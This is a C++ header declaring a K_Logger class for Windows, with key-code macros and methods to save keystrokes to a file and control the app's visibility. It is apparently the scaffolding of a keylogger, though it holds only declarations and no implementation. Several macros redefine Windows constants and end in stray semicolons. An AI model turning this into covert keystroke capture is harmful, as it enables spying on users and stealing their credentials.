#pragma once


/*******************************************************************/

/* Date: 10-06-2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright © 2018 Artem Gord1728. All rights reserved.           */

/* Description: Header with basic functionality                    */

/*******************************************************************/




#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <time.h>


#define VK_SPACE 0x20;
#define VK_TAB 0x09;
#define VK_LWIN 0x5B;
#define VK_RETURN 0x0D;
#define VK_BACK 0x08;
#define VK_ESCAPE 0x1B; 
#define VK_UP 0x26;
#define VK_DOWN 0x28;
#define VK_DELETE 0x2E;
#define VK_LEFT 0x25;
#define VK_RIGHT 0x27;
#define VK_INSERT 0x2D;
#define VK_CONTROL 0x11
#define VK_RBUTTON 0x02;
#define VK_LBUTTON 0x01;
#define VK_CAPITAL 0x14;
#define VK_SNAPSHOT 0x2c; 
#define VK_LMENU 0xA4;
#define VK_MBUTTON 0x04; 


class K_Logger
{
public:
	void WriteToFile(LPCSTR text);
	int SaveSymbol(WORD iKey);
	void VisibilityApp();
};